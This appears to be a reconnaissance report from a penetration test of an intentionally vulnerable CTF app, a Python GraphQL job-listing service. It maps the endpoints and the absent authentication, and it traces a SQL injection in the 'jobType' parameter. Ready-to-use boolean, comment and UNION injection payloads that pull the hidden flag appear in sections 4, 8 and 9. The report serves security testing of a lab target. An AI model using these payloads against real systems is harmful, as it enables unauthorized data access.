# Reconnaissance Deliverable: Ultimate Job Aggregator

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the application's attack surface, focusing on the network-accessible components of this intentionally vulnerable CTF challenge application.

**Key Sections for Analysis:**
- **Section 4 (API Endpoint Inventory):** Complete catalog of all 3 HTTP endpoints and 1 GraphQL query with exact code locations.
- **Section 7 (Role & Privilege Architecture):** Documents the complete absence of role-based access control.
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized list showing the critical SQL injection bypass vulnerability.
- **Section 9 (Injection Sources):** Critical SQL injection vulnerability at line 60 of main.py.

**Priority Order for Testing:** The primary attack vector is SQL injection in the GraphQL `jobType` parameter, which bypasses the weak authorization check and exposes the flag stored in the database.

---

## 1. Executive Summary

The Ultimate Job Aggregator is a **deliberately vulnerable CTF challenge application** implementing a Python-based GraphQL API for a job listing system. The application is built with **Starlette ASGI framework (v0.37.2)** and **Strawberry GraphQL (v0.235.0)**, backed by an **SQLite3 database** containing a hidden flag.

**Core Technology Stack:**
- **Backend:** Python 3.12, Starlette 0.37.2, Strawberry GraphQL 0.235.0
- **Server:** Uvicorn 0.29.0 (ASGI server)
- **Database:** SQLite3 (in-memory, recreated on startup)
- **Frontend:** Bootstrap 4.5.2 (CDN), Vanilla JavaScript
- **Deployment:** Docker container on port 80 (HTTP only, no TLS)

**Primary User-Facing Components:**
1. **HTML Frontend** (`/`) - Job listing interface with dropdown filter
2. **GraphQL API** (`/graphql`) - Single query endpoint for job retrieval
3. **Health Check** (`/ping`) - Docker health monitoring endpoint

**Critical Security Findings:**
- **ZERO authentication mechanisms** - All endpoints are publicly accessible
- **Broken authorization** - Simple string comparison bypassed via SQL injection
- **Critical SQL injection** - User input directly interpolated into SQL query (line 60)
- **No security middleware** - No CORS, CSRF, rate limiting, or session management
- **Plaintext secrets** - Flag stored unencrypted in database and multiple file locations

The application demonstrates the **critical difference between using modern frameworks and implementing secure coding practices**. While the technology stack is current (Python 3.12, 2024 framework versions), the complete absence of security controls creates a trivially exploitable attack surface for external attackers.

---

## 2. Technology & Service Map

### Frontend
- **Framework:** None (Vanilla JavaScript)
- **UI Library:** Bootstrap 4.5.2 (CDN: stackpath.bootstrapcdn.com)
- **Key Libraries:** None (no React, Vue, Angular)
- **Authentication Libraries:** None
- **File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/static/index.html`

### Backend
- **Language:** Python 3.12
- **Framework:** Starlette 0.37.2 (ASGI)
- **GraphQL:** Strawberry GraphQL 0.235.0
- **Server:** Uvicorn 0.29.0
- **Database Driver:** sqlite3 (Python standard library)
- **Key Dependencies:** 
  - strawberry-graphql==0.235.0
  - uvicorn==0.29.0
  - starlette==0.37.2
- **File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` (93 lines)

### Infrastructure
- **Hosting Provider:** Docker container (local deployment)
- **CDN:** StackPath (for Bootstrap CSS only)
- **Database Type:** SQLite3 (embedded, in-memory file)
- **Reverse Proxy:** None (Uvicorn serves directly on port 80)
- **TLS/SSL:** None (HTTP only, no HTTPS)
- **Container:** Docker (python:3.12 base image)

### Identified Subdomains
**None** - Application runs on localhost:38609 only. Subfinder scan returned no results.

### Open Ports & Services
Based on nmap scan results:

| Port | Service | Version | Purpose | Security Notes |
|------|---------|---------|---------|----------------|
| 80/tcp | http | Caddy httpd | Reverse proxy (external) | No title, basic Caddy installation |
| 443/tcp | ssl/https | - | HTTPS (external) | No title, not used by target app |
| 631/tcp | ipp | CUPS 2.3 | Print service | Out of scope (not app-related) |
| 9999/tcp | http | Unknown | HTTP service | Returns "OK", CORS enabled |
| 49152/tcp | http | Golang net/http | Tailscale | Requires auth, out of scope |
| **38609/tcp** | **http** | **uvicorn** | **TARGET APPLICATION** | **Python ASGI server** |

**Primary Attack Surface:** Port 38609 serving the vulnerable application via Uvicorn.

---

## 3. Authentication & Session Management Flow

### Entry Points
**CRITICAL FINDING:** This application implements **ZERO authentication mechanisms**.

**No authentication endpoints exist:**
- ❌ No `/login` endpoint
- ❌ No `/register` endpoint
- ❌ No `/auth/*` routes
- ❌ No OAuth/SSO callbacks
- ❌ No API key validation

**Available endpoints (all unauthenticated):**
- `GET /` - Serves static HTML frontend (no auth check)
- `POST /graphql` - GraphQL API endpoint (no auth check)
- `GET /ping` - Health check (no auth check)

### Mechanism
**NOT APPLICABLE** - No authentication mechanism exists.

The application is **completely stateless** with no concept of user identity:
- No credential submission
- No token generation
- No cookie setting
- No session creation
- No user identification

Every request is processed anonymously with full access to all functionality (except "private" jobs, which are weakly protected by a bypassable check).

### Code Pointers
**Authentication Code Locations:** **NONE**

**Evidence of absence:**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py`
- **Line 1-10:** Import statements include NO authentication libraries (no passlib, no python-jose, no authlib)
- **Line 87:** Application initialization with NO middleware: `app = Starlette(routes=routes)`
- **Lines 48-68:** GraphQL resolver receives `_info: Info` parameter but never examines it for authentication context

**What THIS means for external attackers:** Any network client can immediately access the GraphQL API without credentials, session tokens, or API keys.

---

### 3.1 Role Assignment Process

**CRITICAL FINDING:** No role system exists.

- **Role Determination:** NOT APPLICABLE - No users, no roles
- **Default Role:** NOT APPLICABLE - No registration process
- **Role Upgrade Path:** NOT APPLICABLE - No role management
- **Code Implementation:** The word "admin" appears only once in an error message (line 57): `"Only admins can see private jobs"` - this is security theater, not actual role enforcement

**Evidence:**
- No `users` database table
- No `roles` database table
- No role assignment logic
- No role validation functions
- Single hardcoded authorization check validates **input value**, not **user identity**

---

### 3.2 Privilege Storage & Validation

**NOT APPLICABLE** - No privilege system exists.

- **Storage Location:** N/A (no privileges to store)
- **Validation Points:** Single check at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py`, lines 55-57
- **Cache/Session Persistence:** N/A (no sessions)
- **Code Pointers:** 
  ```python
  # Line 55-57: Only "authorization" check in entire application
  if job_type and job_type == 'private':
      conn.close()
      raise Exception("Only admins can see private jobs")
  ```
  This checks the **parameter value**, not user privileges.

---

### 3.3 Role Switching & Impersonation

**NOT APPLICABLE** - No role system exists.

- **Impersonation Features:** None
- **Role Switching:** None
- **Audit Trail:** None (no logging implemented)
- **Code Implementation:** N/A

---

## 4. API Endpoint Inventory

**Network Surface Focus:** All 3 endpoints below are network-accessible via HTTP requests to http://localhost:38609.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|-------------------------|---------------------------|
| GET | `/` | anon | None | None | Serves static HTML frontend. Returns contents of `static/index.html`. **Code:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` lines 71-73, handler: `read_root()` |
| GET | `/ping` | anon | None | None | Health check endpoint for Docker. Returns static string "pong". **Code:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` lines 76-77, handler: `ping()` |
| POST/GET | `/graphql` | anon | None | **BROKEN:** String check at line 55-57 | GraphQL API endpoint. Accepts GraphQL queries. **CRITICAL:** Contains SQL injection vulnerability. **Code:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` line 82, GraphQL mount |

### GraphQL API Details

**Schema Structure:**
- **Query Type:** `Query` (lines 48-68)
- **Available Query Fields:** `jobs(jobType: String = ""): [Job]`
- **Return Type:** List of `Job` objects

**Job Type Definition** (lines 40-45):
```python
@strawberry.type
class Job:
    id: int
    name: str
    type: str
    description: str
```

**jobs Query Detailed Analysis:**

| Attribute | Value |
|-----------|-------|
| **Field Name** | `jobs` |
| **Location** | `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` lines 50-68 |
| **Decorator** | `@strawberry.field` (line 50) |
| **Required Role** | anon (no authentication) |
| **Parameters** | `job_type: str = ""` (optional filter) |
| **Object ID Parameters** | None (filters by type, not individual IDs) |
| **Authorization Mechanism** | Inline check at lines 55-57: `if job_type == 'private': raise Exception` |
| **Authorization Bypass** | **YES** - SQL injection at line 60 bypasses the check |
| **Returns** | List of Job objects with id, name, type, description fields |

**SQL Injection Vulnerability:**
- **Location:** Line 60
- **Vulnerable Code:** `query = f"SELECT * FROM jobs WHERE type = '{job_type}'"`
- **Impact:** Bypasses authorization, exposes flag in "private" job's description field
- **Exploitation:** Set `jobType: "' OR type='private' --"` to extract hidden jobs

---

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** All input vectors below are accessible through network requests to the deployed application.

### URL Parameters
**None** - The application does not process URL query parameters. All three endpoints ignore query strings.

### POST Body Fields (JSON/Form)

**GraphQL Request Body** (POST to `/graphql`):
- **Field:** `query` (GraphQL query string)
  - **Type:** String (GraphQL SDL syntax)
  - **Location (Client):** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/static/index.html` lines 39-48
  - **Location (Server):** Handled by Strawberry GraphQL framework
  - **Validation:** Syntax validation by GraphQL parser only
  - **Security Impact:** Query structure validated, but parameter values are NOT sanitized

- **Field:** `jobType` parameter within GraphQL query
  - **Type:** String
  - **Location (Server):** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` line 51
  - **Parameter Definition:** `job_type: str = ""`
  - **Validation:** **NONE** (type hint only, no runtime validation)
  - **Sanitization:** **NONE**
  - **Usage:** Directly interpolated into SQL query at line 60
  - **Security Impact:** **CRITICAL SQL INJECTION**

**Example Vulnerable Request:**
```json
POST /graphql HTTP/1.1
Content-Type: application/json

{
  "query": "{ jobs(jobType: \"' OR '1'='1\") { id name type description } }"
}
```

### HTTP Headers
**None actively processed** - The application does not read or process custom HTTP headers.

**Headers Ignored:**
- `X-Forwarded-For` - Not used
- `User-Agent` - Not logged or processed
- `Authorization` - Not checked (no auth system)
- `Cookie` - Not read (no session management)

**Headers Set by Framework:**
- `Content-Type` - Set by Starlette (application/json for GraphQL)
- `Access-Control-Allow-Origin` - Not configured (no CORS middleware)

### Cookie Values
**None** - The application does NOT set or read any cookies.

**Evidence:**
- No `Set-Cookie` headers in responses
- No `SessionMiddleware` configured
- No cookie parsing in request handlers
- Stateless application design

### File Uploads
**None** - The application does not accept file uploads.

### GraphQL Query Structure
**Input Vector Summary for GraphQL:**

| Parameter | Entry Point | Server Location | Validation | Sanitization | Risk Level |
|-----------|-------------|-----------------|------------|--------------|------------|
| `jobType` | GraphQL query `jobs()` | Line 51 | Type hint only | **NONE** | **CRITICAL** |

---

## 6. Network & Interaction Map

**Network Surface Focus:** Only network-accessible components are mapped. Build systems, local tools, and development utilities are excluded.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| ExternalUser | ExternAsset | Internet | Browser | None | External attacker with no internal access |
| BootstrapCDN | ThirdParty | Internet | StackPath CDN | Public | CSS framework delivery |
| UvicornServer | Service | App | Python/Uvicorn 0.29.0 | PII, Secrets | ASGI server serving on port 38609 |
| GraphQLAPI | Service | App | Strawberry 0.235.0 | PII, Secrets | GraphQL endpoint with SQL injection |
| SQLiteDB | DataStore | Data | SQLite3 | PII, Secrets | Embedded database containing flag |
| StaticFiles | Service | App | Filesystem | Public | HTML/CSS frontend files |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| UvicornServer | Hosts: `http://localhost:38609`; Endpoints: `/`, `/graphql`, `/ping`; Auth: **None**; Framework: Starlette 0.37.2; Dependencies: SQLiteDB, StaticFiles |
| GraphQLAPI | Schema: Strawberry; Queries: `jobs(jobType)`; Mutations: **None**; Introspection: **Enabled**; Auth: **None**; Rate Limiting: **None**; Vulnerabilities: SQL Injection (line 60) |
| SQLiteDB | Engine: `SQLite3`; File: `/app/test.db`; Encryption: **None**; Access Control: **None**; Tables: `jobs` (4 columns); Flag Location: `jobs.description WHERE type='private'`; Credentials: **None required** |
| StaticFiles | Location: `/app/static/`; Files: `index.html`; Served by: `read_root()` at line 71-73; XSS Sinks: 2 (lines 61-65, 84-96 in index.html) |
| BootstrapCDN | URL: `https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css`; Version: 4.5.2 (2020); SRI: **Not implemented**; Risk: Supply chain attack |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| ExternalUser → UvicornServer | HTTPS | `:38609 /` | None | Public |
| ExternalUser → UvicornServer | HTTPS | `:38609 /graphql` | None | PII, Secrets |
| ExternalUser → BootstrapCDN | HTTPS | `:443 /bootstrap/4.5.2/` | None | Public |
| UvicornServer → GraphQLAPI | Internal | In-process | None | PII, Secrets |
| GraphQLAPI → SQLiteDB | TCP | File I/O | None | PII, Secrets |
| UvicornServer → StaticFiles | Internal | File I/O | None | Public |

**Critical Flow - Flag Extraction Path:**
```
ExternalUser → UvicornServer (:38609/graphql) [No Guards]
  → GraphQLAPI (jobs query with jobType parameter) [Weak Guard: string check]
    → SQLiteDB (SQL query with f-string interpolation) [No Guards]
      → Flag in description field (type='private')
```

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| None | N/A | **No guards implemented** - Application has zero network security controls |
| auth:none | Auth | All endpoints are publicly accessible with no authentication required |
| authz:weak | Authorization | Single inline check at line 55-57: `if job_type == 'private'` - checks parameter value, not user identity |
| authz:bypassable | Authorization | The weak authorization check is trivially bypassed via SQL injection |
| sql:unsanitized | Input Validation | User input directly interpolated into SQL at line 60 with no sanitization |
| rate:unlimited | RateLimit | No rate limiting - unlimited requests allowed |
| cors:none | Network | No CORS middleware configured |
| csrf:none | Protocol | No CSRF protection (application is stateless, so CSRF is not directly applicable) |

**Guard Implementation Locations:**
- **authz:weak** - `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` lines 55-57

---

## 7. Role & Privilege Architecture

### 7.1 Discovered Roles

**CRITICAL FINDING:** No role system exists. The following table documents the theoretical roles implied by the error message, but they are not implemented.

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|-----------------|--------------|---------------------|
| anon | 0 | Global | Default state - no authentication required |
| "admin" | ??? | Global | **NOT IMPLEMENTED** - Only mentioned in error message at line 57 |

**Evidence of Missing Role System:**
- No `users` table in database
- No `roles` table in database
- No role assignment logic
- No role validation beyond string comparison
- No role storage mechanism
- Database schema (lines 23-28) shows only `jobs` table with no user/role columns

### 7.2 Privilege Lattice

**NOT APPLICABLE** - No role hierarchy exists.

The application has only one privilege level: **anonymous access**. The error message references "admins" but this is not backed by any authentication or role validation system.

```
Theoretical (not implemented):
anon → admin (via SQL injection bypass)

Actual implementation:
anon → anon (everyone is anonymous)
```

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|---------------------------|----------------------|
| anon | `/` | `/`, `/graphql`, `/ping` | None (no auth) |

**Note:** The "admin" role referenced in line 57 has no corresponding entry points, authentication mechanism, or privilege validation.

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|-------------------|-------------------|------------------|
| anon | None | None | N/A |
| "admin" | **NOT IMPLEMENTED** | Line 55-57: `if job_type == 'private': raise Exception("Only admins can see private jobs")` | **NOT IMPLEMENTED** |

**Critical Finding:** The "admin" check at line 55-57 validates the **parameter value**, not the **user's role**. This is not role-based access control—it's input filtering that can be bypassed via SQL injection.

---

## 8. Authorization Vulnerability Candidates

### 8.1 Horizontal Privilege Escalation Candidates

**NOT APPLICABLE** - No user accounts exist, therefore no horizontal privilege escalation is possible.

The application has no concept of user ownership. The database has no user_id columns, no ownership relationships, and no multi-user architecture.

**Why This Section is Empty:**
- No user accounts
- No user_id parameters in any endpoint
- No "my data" vs "other user's data" concept
- Single shared data pool for all anonymous requests

### 8.2 Vertical Privilege Escalation Candidates

**Status:** One pseudo-vertical escalation vulnerability (anonymous → "admin" data access)

| Target Role | Endpoint Pattern | Functionality | Risk Level | Vulnerability Type |
|-------------|------------------|---------------|------------|-------------------|
| "admin" | `/graphql` (jobs query) | Access to "private" job listings | **CRITICAL** | SQL Injection Bypass |

**Detailed Analysis:**

**Endpoint:** `POST /graphql`
- **Query:** `jobs(jobType: String)`
- **Current Access:** Anonymous users can query public jobs (front-end, back-end types)
- **Restricted Access:** Private jobs (type='private') containing flag
- **Protection Mechanism:** String comparison at line 55-57
- **Bypass Method:** SQL injection at line 60

**Exploitation Path:**
```graphql
# Normal request (blocked):
{ jobs(jobType: "private") { description } }
# Error: "Only admins can see private jobs"

# SQL injection bypass:
{ jobs(jobType: "' OR type='private' --") { description } }
# Returns: Flag in description field
```

**Code Locations:**
- **Restriction:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` line 55-57
- **Bypass Vulnerability:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` line 60
- **Flag Storage:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` line 34 (inserted into database)

### 8.3 Context-Based Authorization Candidates

**NOT APPLICABLE** - The application has no multi-step workflows or stateful processes.

**Why This Section is Empty:**
- No checkout flows
- No onboarding wizards
- No password reset processes
- No multi-step forms
- Single-page application with one-shot queries

All operations are single-request, stateless interactions with no workflow state to bypass.

---

## 9. Injection Sources (Command Injection and SQL Injection)

**Network Surface Focus:** All sources listed below are in network-accessible code paths reachable via HTTP requests.

### SQL Injection Sources

**CRITICAL VULNERABILITY: SQL Injection via GraphQL Parameter**

#### Vulnerability INJ-001: Classic SQL Injection

**Severity:** CRITICAL  
**CWE:** CWE-89 (SQL Injection)  
**CVSS 3.1 Score:** 9.8 (Critical)

**Complete Data Flow:**

```
1. HTTP Request Entry Point:
   POST http://localhost:38609/graphql
   Content-Type: application/json
   Body: {"query": "{ jobs(jobType: \"PAYLOAD\") { description } }"}

2. Starlette Routing (line 82):
   Mount("/graphql", GraphQL(strawberry.Schema(query=Query)))
   
3. Strawberry GraphQL Parsing:
   Extracts jobType parameter from query
   
4. GraphQL Resolver Invocation (line 50-68):
   Query.jobs(self, _info, job_type="PAYLOAD")
   
5. Weak Authorization Check (lines 55-57):
   if job_type and job_type == 'private':
       raise Exception("Only admins can see private jobs")
   # BYPASSED if job_type != literal string "private"
   
6. DATABASE QUERY CONSTRUCTION (line 60) - VULNERABLE:
   if job_type:
       query = f"SELECT * FROM jobs WHERE type = '{job_type}'"
   # CRITICAL: User input directly interpolated via f-string
   
7. SQL Execution Sink (line 64):
   cursor.execute(query)
   # Executes attacker-controlled SQL query
   
8. Data Exfiltration (line 65):
   jobs = cursor.fetchall()
   # Returns results including flag if SQL injection successful
```

**Exact Code Locations:**

| Component | File Path | Line Number | Code Snippet |
|-----------|-----------|-------------|--------------|
| Entry Point | `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` | 51 | `def jobs(self, _info: Info, job_type: str = "")` |
| Weak Check | `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` | 55-57 | `if job_type and job_type == 'private': raise Exception(...)` |
| **VULNERABLE SINK** | `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` | **60** | `query = f"SELECT * FROM jobs WHERE type = '{job_type}'"` |
| Execution | `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` | 64 | `cursor.execute(query)` |

**Vulnerability Details:**

**Input Parameter:**
- **Name:** `job_type`
- **Type:** String (Python type hint, no runtime validation)
- **Default:** `""` (empty string)
- **Validation:** NONE (only string equality check for "private")
- **Sanitization:** NONE
- **Escaping:** NONE

**SQL Query Construction Method:** **UNSAFE**
- **Method:** Python f-string interpolation
- **Pattern:** `f"SELECT * FROM jobs WHERE type = '{job_type}'"`
- **Risk:** Direct string concatenation allows SQL metacharacter injection

**Why This is Unsafe:**
1. **No Parameterization:** Does not use SQLite parameterized queries (`?` placeholders)
2. **No Escaping:** Special characters (`'`, `"`, `--`, `;`) are not escaped
3. **String Concatenation:** F-string directly embeds user input into SQL syntax
4. **Weak Validation:** Authorization check only blocks exact string "private", not SQL injection payloads

**Safe Alternative (Not Implemented):**
```python
# Secure parameterized query:
if job_type:
    query = "SELECT * FROM jobs WHERE type = ?"
    cursor.execute(query, (job_type,))
```

**Exploitation Examples:**

**Payload 1: Boolean-Based Bypass**
```graphql
query {
  jobs(jobType: "' OR '1'='1") {
    id
    name
    type
    description
  }
}
```
**Resulting SQL:** `SELECT * FROM jobs WHERE type = '' OR '1'='1'`  
**Impact:** Returns all jobs including private ones

**Payload 2: Direct Flag Extraction**
```graphql
query {
  jobs(jobType: "' OR type='private' --") {
    description
  }
}
```
**Resulting SQL:** `SELECT * FROM jobs WHERE type = '' OR type='private' --'`  
**Impact:** Returns only private jobs, exposing flag in description field

**Payload 3: UNION-Based Injection**
```graphql
query {
  jobs(jobType: "' UNION SELECT id, name, type, description FROM jobs WHERE type='private' --") {
    description
  }
}
```
**Resulting SQL:** `SELECT * FROM jobs WHERE type = '' UNION SELECT id, name, type, description FROM jobs WHERE type='private' --'`  
**Impact:** Explicitly queries private jobs, guaranteed flag extraction

**Impact Assessment:**
- **Confidentiality:** HIGH - Can extract all database records including the flag
- **Integrity:** MEDIUM - SQLite supports UPDATE/DELETE via injection
- **Availability:** MEDIUM - Can execute expensive queries for DoS
- **Business Impact:** CRITICAL - Direct flag extraction violates CTF challenge

**Flag Storage Location:**
- **Database:** SQLite `test.db` file
- **Table:** `jobs`
- **Column:** `description`
- **Filter:** `WHERE type='private'`
- **Insertion Code:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` line 34

---

### Command Injection Sources

**FINDING:** **NO COMMAND INJECTION VULNERABILITIES DETECTED**

**Analysis Performed:**
Comprehensive search of all network-accessible code paths for command execution functions:

**Functions Searched (Not Found):**
- `os.system()` - Not used
- `subprocess.run()` - Not used
- `subprocess.Popen()` - Not used
- `subprocess.call()` - Not used
- `exec()` - Not used
- `eval()` - Not used
- `compile()` - Not used

**Imports Analyzed:**
```python
# File: /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py
import sqlite3
from typing import List
import strawberry
from starlette.applications import Starlette
from starlette.responses import HTMLResponse
from starlette.routing import Route, Mount
from strawberry.asgi import GraphQL
from strawberry.types import Info
import uvicorn
```

**No subprocess or os modules imported** - Application cannot execute shell commands.

**File Operations (Verified Safe):**
- **Operation 1:** `open("flag.txt")` at line 19 - Hardcoded path, no user input
- **Operation 2:** `open("static/index.html")` at line 72 - Hardcoded path, no user input

**Conclusion:** The application performs NO command execution and has NO command injection attack surface.

---

### Safe Database Operations

The following database operations are SAFE (not vulnerable):

| Location | Operation | Safety Reason |
|----------|-----------|---------------|
| Line 23 | `CREATE TABLE` | Static SQL, no user input |
| Line 29 | `DELETE FROM jobs` | Static SQL, no user input |
| Lines 30-35 | `INSERT INTO jobs` | Uses flag variable (controlled), not user input |
| Line 62 | `SELECT ... WHERE type IN (...)` | Static SQL, no user input (executed when jobType is empty) |

---

## 10. Additional Security Findings

### Missing Security Controls

**Authentication & Session Management:**
- ❌ No user authentication
- ❌ No session management
- ❌ No API keys or bearer tokens
- ❌ No OAuth/SSO integration

**Input Validation:**
- ❌ No input sanitization
- ❌ No allowlist validation
- ❌ No length restrictions
- ❌ No format validation (regex)

**Security Headers:**
- ❌ No Content-Security-Policy
- ❌ No X-Frame-Options
- ❌ No X-Content-Type-Options
- ❌ No Strict-Transport-Security
- ❌ No Referrer-Policy

**Middleware:**
- ❌ No CORS middleware
- ❌ No CSRF protection
- ❌ No rate limiting
- ❌ No request logging

**GraphQL Security:**
- ❌ Introspection enabled (information disclosure)
- ❌ No query depth limiting
- ❌ No query complexity analysis
- ❌ No field-level authorization

**Database Security:**
- ❌ No encryption at rest
- ❌ No parameterized queries
- ❌ No query logging
- ❌ No access controls

**Secrets Management:**
- ❌ Flag stored in plaintext
- ❌ Flag in environment variables (.env file)
- ❌ Flag in Docker build arguments
- ❌ Flag in container image layers
- ❌ Flag in database unencrypted

### XSS Sinks (Frontend)

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/static/index.html`

**Sink 1: Error Message Rendering (lines 61-65)**
```javascript
if (json.errors) {
    const errorMessages = json.errors.map(error => error.message).join(', ');
    resultDiv.innerHTML = `<div class="alert alert-danger">Error: ${errorMessages}</div>`;
}
```
**Risk:** DOM-based XSS if error messages contain HTML

**Sink 2: Job Data Rendering (lines 84-96)**
```javascript
data.forEach(job => {
    jobsTable += `<tr>
        <td>${job.id}</td>
        <td>${job.name}</td>
        <td>${job.type}</td>
        <td>${job.description}</td>
    </tr>`;
});
resultDiv.innerHTML = jobsTable;
```
**Risk:** Stored XSS if database contains malicious HTML (injectable via SQL injection)

---

## Summary Statistics

**Codebase:**
- Total Python Files: 1
- Total Lines of Code: 93 (main.py)
- Frontend Files: 1 (index.html, 107 lines)

**Attack Surface:**
- HTTP Endpoints: 3
- GraphQL Queries: 1
- GraphQL Mutations: 0
- Authentication Required: 0
- SQL Injection Vulnerabilities: 1 (CRITICAL)
- Command Injection Vulnerabilities: 0
- XSS Sinks: 2 (Frontend)
- Authorization Checks: 1 (Weak, bypassable)

**Primary Attack Vector:**
SQL injection in GraphQL `jobType` parameter bypasses weak authorization and exposes flag stored in database.

---

**END OF RECONNAISSANCE DELIVERABLE**